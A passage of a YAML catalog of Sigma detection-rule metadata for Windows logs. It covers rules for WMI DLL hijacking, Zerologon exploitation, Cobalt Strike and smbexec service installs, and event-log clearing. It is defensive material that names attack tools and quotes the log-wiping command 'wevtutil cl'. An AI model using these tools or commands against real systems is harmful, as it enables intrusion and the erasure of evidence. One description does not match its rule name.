  - https://twitter.com/mattifestation/status/899646620148539397
  - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/
  false_positives:
  - Unknown (data set is too small; further testing needed)
  notes: ''
- detection_id: f6c68d5f-e101-4b86-8c84-7d96851fd65c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_wmiprvse_wbemcomn_dll_hijack.yml
  name: T1047 Wmiprvse Wbemcomn DLL Hijack
  description: Detects a threat actor creating a file named `wbemcomn.dll` in the
    `C:\Windows\System32\wbem\` directory over the network for a WMI DLL Hijack scenario.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1047
  tags:
  - attack.execution
  - attack.t1047
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://threathunterplaybook.com/hunts/windows/201009-RemoteWMIWbemcomnDLLHijack/notebook.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 411742ad-89b0-49cb-a7b0-3971b5c1e0a4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security/win_security_workstation_was_locked.yml
  name: Locked Workstation
  description: Detects locked workstation session events that occur automatically
    after a standard period of inactivity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: stable
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques: []
  tags:
  - attack.impact
  time_window: ''
  references:
  - https://www.cisecurity.org/controls/cis-controls-list/
  - https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf
  - https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.04162018.pdf
  - https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4800
  false_positives:
  - Likely
  notes: ''
- detection_id: 0b0ea3cc-99c8-4730-9c53-45deee2a4c86
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security_mitigations/win_security_mitigations_defender_load_unsigned_dll.yml
  name: Microsoft Defender Blocked from Loading Unsigned DLL
  description: Detects Code Integrity (CI) engine blocking Microsoft Defender's processes
    (MpCmdRun and NisSrv) from loading unsigned DLLs which may be an attempt to sideload
    arbitrary DLL
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security-mitigations
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8289bf8c-4aca-4f5a-9db3-dc3d7afe5c10
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/security_mitigations/win_security_mitigations_unsigned_dll_from_susp_location.yml
  name: Unsigned Binary Loaded From Suspicious Location
  description: Detects Code Integrity (CI) engine blocking processes from loading
    unsigned DLLs residing in suspicious locations
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security-mitigations
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/45fd5be71a51aa518b1b36d4e1f36af498084e27/ETWEventsList/CSV/Windows11/21H2/W11_21H2_Pro_20220719_22000.795/Providers/Microsoft-Windows-Security-Mitigations.csv
  false_positives:
  - Unknown
  notes: ''
- detection_id: b55d23e5-6821-44ff-8a6e-67218891e49f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/servicebus/win_hybridconnectionmgr_svc_running.yml
  name: HybridConnectionManager Service Running
  description: Rule to detect the Hybrid Connection Manager service running on an
    endpoint.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: microsoft-servicebus-client
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1554
  tags:
  - attack.persistence
  - attack.t1554
  time_window: ''
  references:
  - https://twitter.com/Cyb3rWard0g/status/1381642789369286662
  false_positives:
  - Legitimate use of Hybrid Connection Manager via Azure function apps.
  notes: ''
- detection_id: 83c161b6-ca67-4f33-8ad0-644a0737cf07
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/shell_core/win_shell_core_susp_packages_installed.yml
  name: Suspicious Application Installed
  description: Detects suspicious application installed by looking at the added shortcut
    to the app resolver cache
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: shell-core
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  time_window: ''
  references:
  - https://nasbench.medium.com/finding-forensic-goodness-in-obscure-windows-event-logs-60e978ea45a3
  false_positives:
  - Packages or applications being legitimately used by users or administrators
  notes: ''
- detection_id: 71886b70-d7b4-4dbf-acce-87d2ca135262
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/smbclient/security/win_smbclient_security_susp_failed_guest_logon.yml
  name: Suspicious Rejected SMB Guest Logon From IP
  description: Detect Attempt PrintNightmare (CVE-2021-1675) Remote code execution
    in Windows Spooler Service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: smbclient-security
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1110.001
  tags:
  - attack.credential-access
  - attack.t1110.001
  time_window: ''
  references:
  - https://twitter.com/KevTheHermit/status/1410203844064301056
  - https://web.archive.org/web/20210629055600/https://github.com/hhlxf/PrintNightmare/
  - https://web.archive.org/web/20210701042336/https://github.com/afwu/PrintNightmare
  false_positives:
  - Account fallback reasons (after failed login with specific account)
  notes: ''
- detection_id: 8d91f6e4-9f3b-4c21-ae41-2c5b7d9f7a12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/smbserver/connectivity/win_smbserver_connectivity_unsigned_and_unencrypted_share_connection.yml
  name: Unsigned or Unencrypted SMB Connection to Share Established
  description: 'Detects SMB server connections to shares without signing or encryption
    enabled.

    This could indicate potential lateral movement activity using unsecured SMB shares.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: smbserver-connectivity
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing
  false_positives:
  - Connections from local or private IP addresses to SMB shares without signing or
    encryption enabled for older systems or misconfigured environments. Apply additional
    tuning as needed.
  notes: ''
- detection_id: 4d7f1827-1637-4def-8d8a-fd254f9454df
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/application_popup/win_system_application_sysmon_crash.yml
  name: Sysmon Application Crashed
  description: Detects application popup reporting a failure of the Sysmon service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562
  tags:
  - attack.defense-evasion
  - attack.t1562
  time_window: ''
  references:
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/f1b010ce0ee1b71e3024180de1a3e67f99701fe4/ETWProvidersManifests/Windows10/1803/W10_1803_Pro_19700101_17134.1/WEPExplorer/Application%20Popup.xml#L36
  false_positives:
  - Unknown
  notes: ''
- detection_id: e9d4ab66-a532-4ef7-a502-66a9e4a34f5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/lsasrv/win_system_lsasrv_ntlmv1.yml
  name: NTLMv1 Logon Between Client and Server
  description: Detects the reporting of NTLMv1 being used between a client and server.
    NTLMv1 is insecure as the underlying encryption algorithms can be brute-forced
    by modern hardware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1550.002
  tags:
  - attack.defense-evasion
  - attack.lateral-movement
  - attack.t1550.002
  time_window: ''
  references:
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/f1b010ce0ee1b71e3024180de1a3e67f99701fe4/ETWProvidersManifests/Windows10/22H2/W10_22H2_Pro_20230321_19045.2728/WEPExplorer/LsaSrv.xml
  false_positives:
  - Environments that use NTLMv1
  notes: ''
- detection_id: d22df9cd-2aee-4089-93c7-9dc4eae77f2c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_Iphlpsvc/win_system_isatap_router_address_set.yml
  name: ISATAP Router Address Was Set
  description: 'Detects the configuration of a new ISATAP router on a Windows host.
    While ISATAP is a legitimate Microsoft technology for IPv6 transition, unexpected
    or unauthorized ISATAP router configurations could indicate a potential IPv6 DNS
    Takeover attack using tools like mitm6.

    In such attacks, adversaries advertise themselves as DHCPv6 servers and set malicious
    ISATAP routers to intercept traffic.

    This detection should be correlated with network baselines and known legitimate
    ISATAP deployments in your environment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 12
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  - multi_signal_correlation
  severity: medium
  status: experimental
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Execution
  - Impact
  techniques:
  - T1557
  - T1565.002
  tags:
  - attack.impact
  - attack.credential-access
  - attack.collection
  - attack.initial-access
  - attack.privilege-escalation
  - attack.execution
  - attack.t1557
  - attack.t1565.002
  time_window: ''
  references:
  - https://www.blackhillsinfosec.com/mitm6-strikes-again-the-dark-side-of-ipv6/
  - https://redfoxsec.com/blog/ipv6-dns-takeover/
  - https://www.securityhq.com/blog/malicious-isatap-tunneling-unearthed-on-windows-server/
  - https://medium.com/@ninnesoturan/detecting-ipv6-dns-takeover-a54a6a88be1f
  false_positives:
  - Legitimate ISATAP router configuration in enterprise environments
  - IPv6 transition projects and network infrastructure changes
  - Network administrators configuring dual-stack networking
  - Automatic ISATAP configuration in some Windows deployments
  notes: ''
- detection_id: 994bfd6d-0a2e-481e-a861-934069fcf5f5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_certification_authority/win_system_adcs_enrollment_request_denied.yml
  name: Active Directory Certificate Services Denied Certificate Enrollment Request
  description: 'Detects denied requests by Active Directory Certificate Services.

    Example of these requests denial include issues with permissions on the certificate
    template or invalid signatures.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1553.004
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.t1553.004
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd299871(v=ws.10)
  - https://www.gradenegger.eu/en/details-of-the-event-with-id-53-of-the-source-microsoft-windows-certificationauthority/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 13fc89a9-971e-4ca6-b9dc-aa53a445bf40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_dhcp_server/win_system_susp_dhcp_config.yml
  name: DHCP Server Loaded the CallOut DLL
  description: This rule detects a DHCP server in which a specified Callout DLL (in
    registry) was loaded
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html
  - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx
  - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx
  false_positives:
  - Unknown
  notes: ''
- detection_id: 75edd3fd-7146-48e5-9848-3013d7f0282c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_dhcp_server/win_system_susp_dhcp_config_failed.yml
  name: DHCP Server Error Failed Loading the CallOut DLL
  description: This rule detects a DHCP server error in which a specified Callout
    DLL (in registry) could not be loaded
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  time_window: ''
  references:
  - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html
  - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx
  - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx
  false_positives:
  - Unknown
  notes: ''
- detection_id: bc2e25ed-b92b-4daa-b074-b502bdd1982b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_distributed_com/win_system_lpe_indicators_tabtip.yml
  name: Local Privilege Escalation Indicator TabTip
  description: Detects the invocation of TabTip via CLSID as seen when JuicyPotatoNG
    is used on a system in brute force mode
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Execution
  techniques:
  - T1557.001
  tags:
  - attack.collection
  - attack.execution
  - attack.credential-access
  - attack.t1557.001
  time_window: ''
  references:
  - https://github.com/antonioCoco/JuicyPotatoNG
  false_positives:
  - Unknown
  notes: ''
- detection_id: a62b37e0-45d3-48d9-a517-90c1a1b0186b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_eventlog/win_system_eventlog_cleared.yml
  name: Eventlog Cleared
  description: One of the Windows Eventlogs has been cleared. e.g. caused by "wevtutil
    cl" command execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  tags:
  - attack.defense-evasion
  - attack.t1070.001
  - car.2016-04-002
  time_window: ''
  references:
  - https://twitter.com/deviouspolack/status/832535435960209408
  - https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100
  false_positives:
  - Rollout of log collection agents (the setup routine often includes a reset of
    the local Eventlog)
  - System provisioning (system reset before the golden image creation)
  notes: ''
- detection_id: 100ef69e-3327-481c-8e5c-6d80d9507556
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_eventlog/win_system_susp_eventlog_cleared.yml
  name: Important Windows Eventlog Cleared
  description: Detects the clearing of one of the Windows Core Eventlogs. e.g. caused
    by "wevtutil cl" command execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1070.001
  tags:
  - attack.defense-evasion
  - attack.t1070.001
  - car.2016-04-002
  time_window: ''
  references:
  - https://twitter.com/deviouspolack/status/832535435960209408
  - https://www.hybrid-analysis.com/sample/027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745?environmentId=100
  false_positives:
  - Rollout of log collection agents (the setup routine often includes a reset of
    the local Eventlog)
  - System provisioning (system reset before the golden image creation)
  notes: ''
- detection_id: 993c2665-e6ef-40e3-a62a-e1a97686af79
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_kerberos_key_distribution_center/win_system_kdcsvc_cert_use_no_strong_mapping.yml
  name: Certificate Use With No Strong Mapping
  description: 'Detects a user certificate that was valid but could not be mapped
    to a user in a strong way (such as via explicit mapping, key trust mapping, or
    a SID)

    This could be a sign of exploitation of the elevation of privilege vulnerabilities
    (CVE-2022-34691, CVE-2022-26931, CVE-2022-26923) that can occur when the KDC allows
    certificate spoofing by not requiring a strong mapping.

    Events where the AccountName and CN of the Subject do not match, or where the
    CN ends in a dollar sign indicating a machine, may indicate certificate spoofing.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
  false_positives:
  - If prevalent in the environment, filter on events where the AccountName and CN
    of the Subject do not reference the same user
  - If prevalent in the environment, filter on CNs that end in a dollar sign indicating
    it is a machine name
  notes: ''
- detection_id: b1e0b3f5-b62e-41be-886a-daffde446ad4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_kerberos_key_distribution_center/win_system_kdcsvc_tgs_no_suitable_encryption_key_found.yml
  name: No Suitable Encryption Key Found For Generating Kerberos Ticket
  description: 'Detects errors when a target server doesn''t have suitable keys for
    generating kerberos tickets.

    This issue can occur for example when a service uses a user account or a computer
    account that is configured for only DES encryption on a computer that is running
    Windows 7 which has DES encryption for Kerberos authentication disabled.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/dd348773(v=ws.10)
  - https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/kdc-event-16-27-des-encryption-disabled
  false_positives:
  - Unknown
  notes: ''
- detection_id: 39f919f3-980b-4e6f-a975-8af7e507ef2b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_kernel_general/win_system_susp_critical_hive_location_access_bits_cleared.yml
  name: Critical Hive In Suspicious Location Access Bits Cleared
  description: 'Detects events from the Kernel-General ETW indicating that the access
    bits of a hive with a system like hive name located in the temp directory have
    been reset.

    This occurs when an application tries to access a hive and the hive has not be
    recognized since the last 7 days (by default).

    Registry hive dumping utilities such as QuarksPwDump were seen emitting this behavior.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/nasbench/Misc-Research/blob/b20da2336de0f342d31ef4794959d28c8d3ba5ba/ETW/Microsoft-Windows-Kernel-General.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: f512acbf-e662-4903-843e-97ce4652b740
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_ntfs/win_system_volume_shadow_copy_mount.yml
  name: Volume Shadow Copy Mount
  description: Detects volume shadow copy mount via Windows event log
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  tags:
  - attack.credential-access
  - attack.t1003.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003.002/T1003.002.md#atomic-test-3---esentutlexe-sam-copy
  false_positives:
  - Legitimate use of volume shadow copy mounts (backups maybe).
  notes: ''
- detection_id: 882fbe50-d8d7-4e29-ae80-0648a8556866
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_wer_systemerrorreporting/win_system_crash_dump_created.yml
  name: Crash Dump Created By Operating System
  description: Detects "BugCheck" errors indicating the system rebooted due to a crash,
    capturing the bugcheck code, dump file path, and report ID.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003.002
  - T1005
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1003.002
  - attack.t1005
  time_window: ''
  references:
  - https://www.sans.edu/cyber-research/from-crash-compromise-unlocking-potential-windows-crash-dumps-offensive-security/
  - https://jasonmull.com/articles/offensive/2025-05-12-windows-crash-dumps-offensive-security/
  false_positives: []
  notes: ''
- detection_id: 13cfeb75-9e33-4d04-b0f7-ab8faaa95a59
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/microsoft_windows_windows_update_client/win_system_susp_system_update_error.yml
  name: Windows Update Error
  description: 'Detects Windows update errors including installation failures and
    connection issues. Defenders should observe this in case critical update KBs aren''t
    installed.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - time_window_aggregation
  - repeated_or_escalation_behavior
  severity: informational
  status: stable
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1584
  tags:
  - attack.impact
  - attack.resource-development
  - attack.t1584
  time_window: ''
  references:
  - https://github.com/nasbench/EVTX-ETW-Resources/blob/f1b010ce0ee1b71e3024180de1a3e67f99701fe4/ETWProvidersManifests/Windows10/1903/W10_1903_Pro_20200714_18362.959/WEPExplorer/Microsoft-Windows-WindowsUpdateClient.xml
  false_positives:
  - Unknown
  notes: ''
- detection_id: 18f37338-b9bd-4117-a039-280c81f7a596
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/netlogon/win_system_possible_zerologon_exploitation_using_wellknown_tools.yml
  name: Zerologon Exploitation Using Well-known Tools
  description: This rule is designed to detect attempts to exploit Zerologon (CVE-2020-1472)
    vulnerability using mimikatz zerologon module or other exploits from machine with
    "kali" hostname.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1210
  tags:
  - attack.t1210
  - attack.lateral-movement
  time_window: ''
  references:
  - https://www.secura.com/blog/zero-logon
  - https://bi-zone.medium.com/hunting-for-zerologon-f65c61586382
  false_positives: []
  notes: ''
- detection_id: a0cb7110-edf0-47a4-9177-541a4083128a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/netlogon/win_system_vul_cve_2020_1472.yml
  name: Vulnerable Netlogon Secure Channel Connection Allowed
  description: Detects that a vulnerable Netlogon secure channel connection was allowed,
    which could be an indicator of CVE-2020-1472.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1548
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1548
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc
  false_positives:
  - Unknown
  notes: ''
- detection_id: f14719ce-d3ab-4e25-9ce6-2899092260b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/ntfs/win_system_ntfs_vuln_exploit.yml
  name: NTFS Vulnerability Exploitation
  description: This the exploitation of a NTFS vulnerability as reported without many
    details via Twitter
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1499.001
  tags:
  - attack.impact
  - attack.t1499.001
  time_window: ''
  references:
  - https://twitter.com/jonasLyk/status/1347900440000811010
  - https://twitter.com/wdormann/status/1347958161609809921
  - https://www.bleepingcomputer.com/news/security/windows-10-bug-corrupts-your-hard-drive-on-seeing-this-files-icon/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5a105d34-05fc-401e-8553-272b45c1522d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_cobaltstrike_service_installs.yml
  name: CobaltStrike Service Installations - System
  description: Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1021.002
  - T1543.003
  - T1569.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://www.sans.org/webcasts/119395
  - https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/
  - https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6c0a7755-6d31-44fa-80e1-133e57752680
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_defender_disabled.yml
  name: Windows Defender Threat Detection Service Disabled
  description: Detects when the "Windows Defender Threat Protection" service is disabled.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Administrator actions
  - Auto updates of Windows Defender causes restarts
  notes: ''
- detection_id: 52a85084-6989-40c3-8f32-091e12e13f09
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_hack_smbexec.yml
  name: smbexec.py Service Installation
  description: Detects the use of smbexec.py tool by detecting a specific service
    installation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1021.002
  - T1569.002
  tags:
  - attack.lateral-movement
  - attack.execution
  - attack.t1021.002
  - attack.t1569.002
  time_window: ''
  references:
  - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
  - https://github.com/fortra/impacket/blob/33058eb2fde6976ea62e04bc7d6b629d64d44712/examples/smbexec.py#L286-L296
  - https://github.com/fortra/impacket/blob/edef71f17bc1240f9f8c957bbda98662951ac3ec/examples/smbexec.py#L60
  false_positives:
  - Unknown
  notes: ''
- detection_id: f7385ee2-0e0c-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_clip_services.yml
  name: Invoke-Obfuscation CLIP+ Launcher - System
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
